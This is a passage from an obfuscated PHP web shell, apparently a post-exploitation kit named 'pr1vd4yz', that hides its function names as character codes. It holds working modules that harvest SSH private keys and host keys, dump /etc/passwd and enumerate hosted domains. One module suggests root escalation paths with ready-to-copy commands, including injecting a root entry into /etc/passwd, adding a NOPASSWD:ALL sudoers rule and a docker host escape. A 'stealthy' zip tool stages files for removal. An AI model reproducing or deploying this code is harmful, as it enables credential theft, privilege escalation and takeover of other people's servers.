     <button type="submit" class="pr1vd4yz-logbtn" style="margin-bottom:14px;"><i class="fas fa-search"></i>Scan Logs</button>
    </form>
    <div id="pr1vd4yz-loglist">
     <?= $scan_result ?: '<span style="opacity:.7;">No scan yet.</span>' ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
$p4z_f1 = _prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$p4z_f2 = _prv_str([105,115,95,114,101,97,100,97,98,108,101]);
$p4z_f3 = _prv_str([105,115,95,102,105,108,101]);
$p4z_sc = _prv_str([115,99,97,110,100,105,114]);
$p4z_bn = _prv_str([98,97,115,101,110,97,109,101]);
$p4z_sz = _prv_str([102,105,108,101,115,105,122,101]);
$p4z_gv = _prv_str([103,101,116,101,110,118]);
$p4z_gl = _prv_str([103,108,111,98]);
function p4z_f1x($p){global $p4z_f1;return @$p4z_f1($p);}
function p4z_f2x($p){global $p4z_f2;return $p4z_f2($p);}
function p4z_f3x($p){global $p4z_f3;return @$p4z_f3($p);}
function p4z_rec($dir,$d=0){
  global $p4z_sc, $p4z_f3, $p4z_f2, $p4z_sz;
  $r=[];
  if($d>2)return$r;
  $scan=@$p4z_sc($dir);
  if(!$scan)return$r;
  foreach($scan as$f){
    if($f=='.'||$f=='..')continue;
    $fp=$dir.'/'.$f;
    if(@$p4z_f3($fp)&&@$p4z_f2($fp)&&preg_match('/(id_rsa|id_dsa|id_ed25519|id_ecdsa|authorized_keys|ssh_config|known_hosts|config|.pem|.ppk|ssh2_config)/i',$f)){
    $r[$fp]=@$p4z_sz($fp);
    }
    if(@is_dir($fp))$r+=p4z_rec($fp,$d+1);
  }
  return$r;
}
function p4z_homes(){
  global $p4z_sc;
  $r=[];
  foreach(['/home','/home2','/home3','/root','/etc/ssh','/var/lib/jenkins','/var/backups','/usr/local/directadmin/data/users','/var/www','/var/www/vhosts']as$h){
    if(@is_dir($h)){
    foreach(@$p4z_sc($h)?:[]as$u){
     if($u=='.'||$u=='..')continue;
     $ud="$h/$u";
     if(@is_dir($ud))$r[]=$ud;
    }
    }
  }
  global $p4z_gv;
  $r[]=@$p4z_gv('HOME')?:'/root';
  return array_unique($r);
}
function p4z_size($s){
  if($s<1024)return$s.' B';
  if($s<1024*1024)return round($s/1024,1).' KB';
  return round($s/1024/1024,1).' MB';
}
$ssh_found=[];$show='';
if(isset($_POST['p4zsshscan'])){
  $d1Xe=p4z_homes();
  $searched=[];
  foreach($d1Xe as$dir){
    foreach(['.ssh','ssh','config','.config','']as$d){
    $path=$dir.($d?"/$d":"");
    if(@is_dir($path))$searched+=p4z_rec($path,0);
    }}
  foreach(['/tmp','/var/tmp','/usr/local/apache2/conf','/var/www','/etc/letsencrypt','/etc/nginx','/etc/apache2','/opt','/etc/ssl']as$p){
    if(@is_dir($p))$searched+=p4z_rec($p,1);
  }
  foreach(['/etc/ssh/ssh_host_rsa_key','/etc/ssh/ssh_host_dsa_key','/etc/ssh/ssh_host_ecdsa_key','/etc/ssh/ssh_host_ed25519_key']as$p){
    if(@file_exists($p)&&p4z_f2x($p))$searched[$p]=@$p4z_sz($p);
  }
  foreach(@$p4z_gl('/home*/cpbackup/daily/*/etc/*/.ssh/*')?:[]as$p){
    if(p4z_f3x($p)&&p4z_f2x($p))$searched[$p]=@$p4z_sz($p);
  }
  $ssh_found=$searched;
  if(isset($_POST['showkey'])&&isset($ssh_found[$_POST['showkey']])){
    $k=$_POST['showkey'];
    $show='<div class="pr1vd4yz-keybox">'.htmlspecialchars($p4z_bn($k)).'
    <textarea class="pr1vd4yz-keyarea" readonly>'.trim(p4z_f1x($k)).'</textarea>
    <button type="button" class="pr1vd4yz-keycopy" onclick="navigator.clipboard.writeText(document.querySelector(\'.pr1vd4yz-keyarea\').value);this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1300)">copy</button>
    </div>';
  }
}
?>
<?php if (isset($_GET['sshkey']) || isset($_POST['p4zsshscan'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-key"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">ssh key finder</div>
     <div class="pr1vd4yz-wiz-desc">Deep scan: find, view, and copy all ssh keys & authorized_keys</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-keymodal">
    <form method="post" style="margin-bottom:7px;">
     <input type="hidden" name="p4zsshscan" value="1">
     <button type="submit" class="pr1vd4yz-keybtn" style="margin-bottom:14px;"><i class="fas fa-search"></i>Scan SSH Keys</button>
    </form>
    <?= $show ?>
    <div class="pr1vd4yz-keylist">
    <?php
     if(isset($_POST['p4zsshscan']) && $ssh_found){
       foreach($ssh_found as $file=>$size){
       echo '<div class="pr1vd4yz-keyrow">'.htmlspecialchars(basename($file)).'
       <span class="pr1vd4yz-keysize">'.p4z_size($size).'</span>
       <form method="post" style="display:inline;">
        <input type="hidden" name="p4zsshscan" value="1">
        <input type="hidden" name="showkey" value="'.htmlspecialchars($file).'">
        <button type="submit" class="pr1vd4yz-keybtn"><i class="fas fa-eye"></i>View</button>
       </form>
       </div>';
       }
     } else if(isset($_POST['p4zsshscan'])) {
       echo '<div style="color:#e53935;opacity:.92;font-size:1.1em;padding:10px 0 8px 0;">No SSH keys or authorized_keys found anywhere.</div>';
     } else {
       echo '<span style="opacity:.7;">No scan yet.</span>';
     }
    ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['rootsuggest'])): ?>
<?php
function pz_rnd($n=9) {
    $a='abcdefghijklmnopqrstuvwxyz'; $s='';
    for($i=0;$i<$n;$i++) $s.=$a[rand(0,25)];
    return $s;
}
function pz_exists($b) { return !!pr1vd4yzC("command -v $b"); }
function pz_writable($f) { return is_writable($f);}
function pz_infile($a, $s) {return strpos($a, $s)!==false;}

$pr1vd4yz_c0m_data = [];
$un7xa   = pr1vd4yzC('uname -a');
$whoami  = pr1vd4yzC('whoami');
$kernel  = pr1vd4yzC('uname -r');
$os = '';
if (file_exists('/etc/os-release')) $os = trim(@file_get_contents('/etc/os-release'));
if (!$os && file_exists('/etc/lsb-release')) $os = trim(@file_get_contents('/etc/lsb-release'));
$distro  = pr1vd4yzC('cat /etc/*release 2>/dev/null | grep PRETTY_NAME | head -n1');
if (!$distro) $distro = pr1vd4yzC('lsb_release -ds 2>/dev/null');
if (!$distro) $distro = pr1vd4yzC('cat /etc/issue 2>/dev/null | head -n1');
$users   = pr1vd4yzC('cut -d: -f1 /etc/passwd');
$sudo    = pr1vd4yzC('sudo -l 2>/dev/null');
$groups  = pr1vd4yzC('id');
$crontab = pr1vd4yzC('crontab -l 2>/dev/null');
$w_passwd = pz_writable('/etc/passwd');
$w_shadow = pz_writable('/etc/shadow');
$w_sudoers = pz_writable('/etc/sudoers');
$docker = file_exists('/.dockerenv') || pz_infile(pr1vd4yzC('cat /proc/1/cgroup 2>/dev/null'), 'docker') ? 'yes' : 'no';

$panel = '';
foreach(['cpanel','plesk','directadmin','ispconfig','webmin','virtualmin','hestia','cockpit','proxmox'] as $x)
    if(pz_exists($x)) $panel.=$x.' ';
$panel = trim($panel);
$cap = pr1vd4yzC('getcap -r / 2>/dev/null | grep "=" | head -n10');
$setuid = pr1vd4yzC('find / -perm -4000 -type f 2>/dev/null | head -n10');
$binaries = [];
foreach(['python3','perl','gcc','socat','awk','vim','nano','less','tar','find','curl','wget','busybox','openssl','docker','runc','base64','vi','nmap','mysql','psql'] as $b)
    if(pz_exists($b)) $binaries[]=$b;

$ai_exploits = [];
$pr1vd4yz_c0med = (pr1vd4yzC('id -u')=='0');
$kernel_sug = [];
if(preg_match('/5\.10\./', $kernel)) $kernel_sug[] = [
    'name'=>'DirtyPipe','desc'=>'Kernel 5.8+ (esp 5.10, 5.15) affected by CVE-2022-0847.','exploit'=>'https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit'
];
if(preg_match('/(3\.10|4\.4|4\.8|4\.15|5\.4|5\.8)/', $kernel)) $kernel_sug[] = [
    'name'=>'DirtyCow/PwnKit/OverlayFS',
    'desc'=>'Multiple local kernel exploits may be available. Search ExploitDB.',
    'exploit'=>'https://www.exploit-db.com/search?keywords=linux+kernel+'.$kernel
];
if(preg_match('/(ubuntu|debian|almalinux|rocky|centos)/i', $os.$distro)) $kernel_sug[] = [
    'name'=>'OS-specific Exploits',
    'desc'=>'Check local privilege escalation exploits for this distro.',
    'exploit'=>'https://www.exploit-db.com/search?keywords='.urlencode($distro)
];
$sudo_sug = [];
if(stripos($sudo, 'NOPASSWD')!==false || stripos($sudo, 'ALL')!==false) {
    foreach(['python3','perl','tar','awk','find','vim','less','vi','nano','bash','sh','nmap'] as $b)
    if(in_array($b, $binaries))
     $sudo_sug[]=[
       'name'=>"GTFOBins: sudo $b",
       'desc'=>"This binary is allowed as root with NOPASSWD, possible shell via GTFOBins.",
       'exploit'=>"https://gtfobins.github.io/gtfobins/$b/",
       'cmd'=>"sudo $b ..."
     ];
}
$writable_sug=[];
if($w_passwd) $writable_sug[]=[
  'name'=>'Writable /etc/passwd',
  'desc'=>'Overwrite root hash and escalate via passwd injection.',
  'exploit'=>'https://www.exploit-db.com/exploits/26368',
  'cmd'=>"echo 'root:\$1\$pr1vd4yz_c0m\$UOxzb7h8zS9E/::0:0:root:/root:/bin/bash' >> /etc/passwd"
];
if($w_shadow) $writable_sug[]=[
  'name'=>'Writable /etc/shadow',
  'desc'=>'Direct hash injection possible, root hash replacement.',
  'exploit'=>'https://www.exploit-db.com/exploits/45010'
];
if($w_sudoers) $writable_sug[]=[
  'name'=>'Writable /etc/sudoers',
  'desc'=>'Escalate to root via custom sudo rule.',
  'exploit'=>'https://gtfobins.github.io/gtfobins/sudo/',
  'cmd'=>'echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
];
$docker_sug = [];
if($docker==='yes')
    $docker_sug[]=[
    'name'=>'Docker/LXC Detected',
    'desc'=>'Escape possible if privileged container.',
    'exploit'=>'https://www.exploit-db.com/exploits/47103',
    'cmd'=>'docker run -v /:/host -it alpine chroot /host sh'
    ];
$cron_sug = [];
if($crontab && (pz_infile($crontab, '/tmp')||pz_infile($crontab, '/dev/shm')))
    $cron_sug[]=[
    'name'=>'Writable Cron',
    'desc'=>'Writable path detected in crontab. Priv esc via malicious cron job.',
    'exploit'=>'https://www.hackingarticles.in/linux-privilege-escalation-cron-jobs/'
    ];
$bin_sug = [];
foreach(['python3','perl','awk','find','tar','vim','less','nmap','busybox'] as $b){
  if(in_array($b,$binaries))
    $bin_sug[]=[
    'name'=>'GTFOBins: '.$b,
    'desc'=>'Privilege escalation possible via GTFOBins binary.',
    'exploit'=>'https://gtfobins.github.io/gtfobins/'.$b.'/'
    ];
}
$setuid_sug = [];
if($setuid)$setuid_sug[]=[
    'name'=>'SetuidBinaries',
    'desc'=>'Some setuid binaries may allow priv esc. Review carefully.',
    'exploit'=>'https://gtfobins.github.io/'
    ];
if($cap)
    $setuid_sug[]=[
    'name'=>'File Capabilities',
    'desc'=>'Some files have Linux capabilities. Review for priv esc.',
    'exploit'=>'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities'
    ];
$panel_sug = [];
if($panel) $panel_sug[]=[
    'name'=>'Panel(s) detected: '.$panel,
    'desc'=>'Check known panel local exploits and backup files.',
    'exploit'=>'https://www.exploit-db.com/search?keywords='.$panel
];
$ai_exploits = array_merge(
  $kernel_sug,
  $sudo_sug,
  $writable_sug,
  $docker_sug,
  $cron_sug,
  $bin_sug,
  $setuid_sug,
  $panel_sug
);

$badge=function($txt,$c){
    return "<span style=\"background:$c;color:#fff;border-radius:5px;padding:2px 8px;font-size:.93em;margin-left:5px;vertical-align:middle;\">$txt</span>";
};
?>
<div class="pr1vd4yz-modal-bg" style="z-index:1112;">
  <div class="pr1vd4yz-root-modal">
    <div class="pr1vd4yz-root-header" style="position:relative;">
    <div class="pr1vd4yz-root-ico"><i class="fas fa-brain-circuit"></i></div>
    <div>
     <div class="pr1vd4yz-root-tit">root escalation suggestion</div>
     <div class="pr1vd4yz-root-desc">ai-powered, kernel+distro+binary+sudo+writable+docker+panel+cron+setuid, fully automated & ready for 2025+</div>
    </div>
    <span class="pr1vd4yz-root-badge-ai">pr1vd4yz ai</span>
    <span class="pr1vd4yz-root-badge-2025">2025 ready</span>
    <button type="button" class="pr1vd4yz-root-close" onclick="document.querySelector('.pr1vd4yz-modal-bg').remove();">&times;</button>
    </div>
    <div class="pr1vd4yz-root-content">
    <div style="color:#e53935;font-size:1.09em;opacity:.96;margin-bottom:9px;">
     <i class="fas fa-user-shield"></i> Current user: <?= htmlspecialchars($whoami) ?> / <?= htmlspecialchars($groups) ?><br>
     <i class="fas fa-server"></i> Kernel: <?= htmlspecialchars($kernel) ?> / <?= htmlspecialchars($distro) ?>
    </div>
    <div class="pr1vd4yz-root-list">
     <?php
     if ($pr1vd4yz_c0med) echo '<div class="pr1vd4yz-root-box" style="border:2.2px solid #10b981;"><div class="pr1vd4yz-root-box-title"><i class="fas fa-star"></i> Already root! </div><div class="pr1vd4yz-root-box-desc">You are already root, but here are post-root tricks!</div></div>';
     foreach ($ai_exploits as $x) {
       $color = (stripos($x['desc'],'possible')||stripos($x['desc'],'may')) ? '#fbbf24' : (stripos($x['desc'],'overwrite')||stripos($x['desc'],'priv esc')||stripos($x['desc'],'CVE') ? '#e53935' : '#1976d2');
       echo '<div class="pr1vd4yz-root-box" style="border-color:'.$color.'">';
       echo '<div class="pr1vd4yz-root-box-title"><i class="fas fa-bolt"></i> '.htmlspecialchars($x['name']).'</div>';
       echo '<div class="pr1vd4yz-root-box-desc">'.htmlspecialchars($x['desc']).'</div>';
       if (!empty($x['exploit']))
       echo '<button class="pr1vd4yz-root-link" onclick="window.open(\''.$x['exploit'].'\')"><i class=\'fas fa-arrow-up-right-from-square\'></i> exploit</button>';
       if (!empty($x['cmd']))
       echo '<button class="pr1vd4yz-root-copy" onclick="navigator.clipboard.writeText(\''.addslashes($x['cmd']).'\');this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1350)"><i class=\'fas fa-copy\'></i> copy</button>';
       echo '</div>';
     }
     if (!$ai_exploits)
       echo '<div class="pr1vd4yz-root-box" style="border-color:#10b981"><div class="pr1vd4yz-root-box-title"><i class="fas fa-shield-halved"></i> secure</div><div class="pr1vd4yz-root-box-desc">No escalation path detected on this system.</div></div>';
     ?>
    </div>
    </div>
  </div>
</div>
<?php endif; ?>

<?php if (isset($_GET['passwd'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:600px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#607d8b;"><i class="fas fa-key"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">read passwd</div>
       <div class="pr1vd4yz-wiz-desc">view /etc/passwd</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div><div class="pr1vd4yz-wiz-section" style="padding:20px 24px;">
     <textarea readonly class="pr1vd4yz-wiz-input" style="
       width:100%; min-height:240px; max-height:440px; font-size:1.07em; background:#fff4f4; color:#374151; 
       border:1.3px solid #ddecec; border-radius:10px; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:14px 11px; box-sizing:border-box; line-height:1.52;
     "><?php
$Vt5 = function($q){$k='';foreach($q as $b){$k.=chr($b);}return $k;};
$gZx = '';
$UyB = [47,101,116,99,47,112,97,115,115,119,100];
$FTy = [99,97,116,32,47,101,116,99,47,112,97,115,115,119,100];
$UoX = $Vt5([105,115,95,114,101,97,100,97,98,108,101]); 
$Jga = $Vt5([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]); 
$U7w = $Vt5([102,117,110,99,116,105,111,110,95,101,120,105,115,116,115]); 
$Acg = $Vt5([115,104,101,108,108,95,101,120,101,99]); 
$Vrv = $Vt5([101,120,101,99]); 
$JHd = $Vt5([105,109,112,108,111,100,101]); 
$Lcy = $Vt5([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]); 
if(@$U7w($UoX) && @$UoX($Vt5($UyB))){
    $gZx = @$Jga($Vt5($UyB));
}
if(!$gZx && @$U7w($Acg)){
    $gZx = @$Acg($Vt5($FTy));
}
if(!$gZx && @$U7w($Vrv)){
    $d90 = [];
    @$Vrv($Vt5($FTy), $d90);
    $gZx = @$JHd("\n", $d90);
}
if(!$gZx){
    $gZx = "Could not read /etc/passwd (permission denied or disabled functions)";
}
echo $Lcy($gZx);
?>
</textarea></div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['domains'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:620px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-globe"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">domains</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a></div>
    <div class="pr1vd4yz-wiz-section" style="padding:19px 24px;">
     <label style="font-size:.99em;color:#ff3939;margin-bottom:7px;display:block;">Detected domains:</label>
     <textarea readonly class="pr1vd4yz-wiz-input" style="
       width:100%; min-height:190px; max-height:440px; font-size:1.07em; background:#eaf6ff; color:#004d77; 
       border:1.3px solid #bde4fa; border-radius:10px; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:14px 11px; box-sizing:border-box; line-height:1.49;
     ">
     <?php
$Zyu = function($q){$k='';foreach($q as $b){$k.=chr($b);}return $k;};
$_mn6z = [];
$_d1z = [47,101,116,99,47,110,97,109,101,100,46,99,111,110,102];
$_d2z = [47,101,116,99,47,104,116,116,112,100,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102];
$_d3z = [47,118,97,114,47,99,112,97,110,101,108,47,117,115,101,114,100,97,116,97,47];
$_d4z = [47,117,115,114,47,108,111,99,97,108,47,100,105,114,101,99,116,97,100,109,105,110,47,100,97,116,97,47,117,115,101,114,115,47];
$_d5z = [47,101,116,99,47,118,105,114,116,117,97,108,47,100,111,109,97,105,110,115];
$_d6z = [47,118,97,114,47,110,97,109,101,100,47];
$_d7z = [47,101,116,99,47,110,103,105,110,120,47,115,105,116,101,115,45,101,110,97,98,108,101,100,47];
$_d8z = [47,118,97,114,47,119,119,119,47,118,104,111,115,116,115,47];
$_d9z = [47,118,97,114,47,119,119,119,47,99,108,105,101,110,116,115,47,99,108,105,101,110,116,42,47,119,101,98,42];
$_hcz = [47,101,116,99,47,104,111,115,116,115];
$fcZ = $Zyu([105,115,95,114,101,97,100,97,98,108,101]);
$flZ = $Zyu([102,105,108,101]);
$fgZ = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$fdZ = $Zyu([102,105,108,101,95,100,111,116,46,103,101,116,95,99,111,110,116,101,110,116,115]);
$fpZ = $Zyu([112,114,101,103,95,109,97,116,99,104]);
$fpaZ = $Zyu([112,114,101,103,95,109,97,116,99,104,95,97,108,108]);
$fdZ2 = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$faZ = $Zyu([97,114,114,97,121,95,117,110,105,113,117,101]);
$famZ = $Zyu([97,114,114,97,121,95,109,101,114,103,101]);
$fafZ = $Zyu([97,114,114,97,121,95,102,105,108,116,101,114]);
$ftrZ = $Zyu([116,114,105,109]);
$fidZ = $Zyu([105,115,95,100,105,114]);
$fgbZ = $Zyu([103,108,111,98]);
$fbsZ = $Zyu([98,97,115,101,110,97,109,101]);
$fexZ = $Zyu([101,120,112,108,111,100,101]);
$fsZ = $Zyu([115,116,114,116,111,108,111,119,101,114]);
$fosZ = $Zyu([80,72,80,95,79,83]);
$fssZ = $Zyu([115,117,98,115,116,114]);
$fgnZ = $Zyu([103,101,116,101,110,118]);
$fhZ = $Zyu([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]);

if(@$fcZ($Zyu($_d1z))){
  $l = @$flZ($Zyu($_d1z));
  foreach($l as $line){
    if(preg_match('#zone\s+"([^"]+)"#',$line,$m)){
    $d=$ftrZ($m[1]);
    if($d && $d!=='localhost') $_mn6z[]=$d;
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d2z))){
  $c=@$fgZ($Zyu($_d2z));
  preg_match_all('#ServerName\s+([^\s]+)#i', $c, $matches);
  if(!empty($matches[1])) $_mn6z=@$faZ(@$famZ($_mn6z,$matches[1]));
}
if(empty($_mn6z) && @$fidZ($Zyu($_d3z))){
  foreach(@$fgbZ($Zyu($_d3z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#^domain:\s*(\S+)#',$line,$m)){
     $_mn6z[]=$m[1];
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d4z))){
  foreach(@$fgbZ($Zyu($_d4z).'*'.'/domains.list') as $file){
    $l=@$fdZ($file, 128);
    foreach($l as $d) if($d) $_mn6z[]=$d;
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d5z))){
  $l=@$flZ($Zyu($_d5z));
  foreach($l as $d) if($ftrZ($d)) $_mn6z[]=$ftrZ($d);
}
if(empty($_mn6z)){
  foreach(@$fgbZ($Zyu($_d6z). '*.db') as $file){
    $n=@$fbsZ($file,'.db');
    if($n && $n!=='localhost') $_mn6z[]=$n;
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d7z))){
  foreach(@$fgbZ($Zyu($_d7z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#server_name\s+([^;]+)#',$line,$m)){
     $arr=explode(' ',$m[1]);
     foreach($arr as $d){
       $d=trim($d," ;\t\n\r");
       if($d && $d!=='_' && $d!=='localhost') $_mn6z[]=$d;
     }
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d8z))){
  foreach(@$fgbZ($Zyu($_d8z).'*') as $dir){
    if(@$fidZ($dir) && preg_match('#/vhosts/([^/]+)$#',$dir,$m)){
    $_mn6z[]=$m[1];
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d9z))){
  foreach(@$fgbZ($Zyu($_d9z)) as $dir){
    $_mn6z[]=@$fbsZ($dir);
  }
}
if(empty($_mn6z) && strtoupper(substr(PHP_OS,0,3))===$Zyu([87,73,78])){
  $env=@$fgnZ($Zyu([83,121,115,116,101,109,68,114,105,118,101])).$Zyu([92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,105,110,101,116,115,114,118,92,99,111,110,102,105,103,92,97,112,112,108,105,99,97,116,105,111,110,72,111,115,116,46,99,111,110,102]);
  if(@$fcZ($env)){
    $l=@$flZ($env);
    foreach($l as $line){
    if(preg_match('/bindingInformation="[^:]+:([^:]+):([^"]+)"/',$line,$m)){
     $d=trim($m[2]);
     if($d && $d!=='localhost' && strpos($d,'*')===false) $_mn6z[]=$d;
    }
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_hcz))){
  $l=@$flZ($Zyu($_hcz));
  foreach($l as $line){
    if(preg_match('/\s([a-z0-9\.-]+\.[a-z]{2,})/i',$line,$m)){
    $d=$fsZ($ftrZ($m[1]));
    if($d && strpos($d,'localhost')===false) $_mn6z[]=$d;
    }
  }
}
$_mn6z=@$faZ(@$fafZ(array_map($ftrZ,$_mn6z)));
echo $_mn6z ? implode("\n",$_mn6z) : "No domains found (no access or no domains configured)";
?>
</textarea>
    </div>
    </div>
  </div>
<?php endif; ?>

<?php if (isset($_GET['ziptool'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:540px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#00897b;"><i class="fas fa-file-archive"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">zip tool</div>
     <div class="pr1vd4yz-wiz-desc">zip any file/dir stealthy</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:8px;">
    <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
     <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="zip_source" class="pr1vd4yz-wiz-input" placeholder="source path (file/dir)" value="<?= isset($_POST['zip_source']) ? htmlspecialchars($_POST['zip_source']) : getcwd() ?>">
       <input type="text" name="zip_name" class="pr1vd4yz-wiz-input" placeholder="zip name (opt)" value="<?= isset($_POST['zip_name']) ? htmlspecialchars($_POST['zip_name']) : '' ?>">
       <button name="zip_do" type="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-blue" style="min-width:80px;"><i class="fas fa-bolt"></i> zip!</button>
     </div>
    </div>
    </form>
    <div class="pr1vd4yz-apilistbox" style="max-height:45vh;overflow:auto;">
    <?php
    if (isset($_POST['zip_do'], $_POST['zip_source']) && trim($_POST['zip_source'])) {
     $src = trim($_POST['zip_source']);
     $zipdir = __DIR__.'/pr1vdayz_ziptool';
     if (!is_dir($zipdir)) @mkdir($zipdir, 0755, true);

     $zipname = trim($_POST['zip_name']);
     if (!$zipname) $zipname = basename($src) . "_" . date("Ymd_His") . ".zip";
     if (substr($zipname, -4) !== '.zip') $zipname .= '.zip';
     $zippath = $zipdir . '/' . preg_replace('/[^a-zA-Z0-9_\.\-]/','_',$zipname);

     $done = false; $msg = '';
     if (class_exists('ZipArchive')) {
       $zip = new ZipArchive();
       if ($zip->open($zippath, ZipArchive::CREATE|ZipArchive::OVERWRITE) === true) {
       $src = realpath($src);
       if (is_dir($src)) {
        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS));
        foreach ($rii as $file) {
          $filePath = $file->getRealPath();
          $localPath = substr($filePath, strlen($src) + 1);
          $zip->addFile($filePath, $localPath);
        }
       } elseif (is_file($src)) {
        $zip->addFile($src, basename($src));
       }
       $zip->close();
       if (file_exists($zippath) && filesize($zippath) > 0) {
        $done = true; $msg = "<b style='color:#1a7f37;'>zip created!</b> <code>".htmlspecialchars($zippath)."</code>";
       }
       }
     }
     if (!$done && function_exists('shell_exec')) {
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       $out = @shell_exec($cmd);
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip shell_exec!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif($out) {
       $msg = "<b style='color:#e53935;'>zip shell error:</b> <span style='color:#b71c1c'>".htmlspecialchars($out)."</span>";
       }
     }
     if (!$done && function_exists('system')) {
       
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       @system($cmd, $ret);
       $out = "";
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip system!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif($out) {
       $msg = "<b style='color:#e53935;'>zip system error:</b> <span style='color:#b71c1c'>".htmlspecialchars($out)."</span>";
       }
     }
     if (!$done && function_exists('exec')) {
       $cmd = "zip -r ".escapeshellarg($zippath)." ".escapeshellarg($src)." 2>&1";
       @exec($cmd, $o, $r);
       if (file_exists($zippath) && filesize($zippath) > 0) {
       $done = true; $msg = "<b style='color:#1a7f37;'>zip exec!</b> <code>".htmlspecialchars($zippath)."</code>";
       } elseif(!empty($o)) {
       $msg = "<b style='color:#e53935;'>zip exec error:</b> <span style='color:#b71c1c'>".htmlspecialchars(implode("\n",$o))."</span>";
       }
     }
     if (!$done && is_file($src)) {
       if (@copy($src, $zippath)) {
       $done = true; $msg = "<b style='color:#fbc02d;'>copied (not zipped)!</b> <code>".htmlspecialchars($zippath)."</code>";
       }
     }
     if ($done) {
       echo '<div class="pr1vd4yz-apirow" style="color:#1a7f37;font-size:1.07em;">'.$msg.'</div>';
     } else {
       echo '<div class="pr1vd4yz-apirow" style="color:#e53935;font-size:1.07em;">zip failed! '.$msg.'</div>';
     }
    }
    ?>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>

<?php if (!empty($_GET['f'])) :
  $file_path = $pr1vxas[0]() . "/" . unx($_GET['f']);
  $file_raw = '';
  if (is_file($file_path)) {
    $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
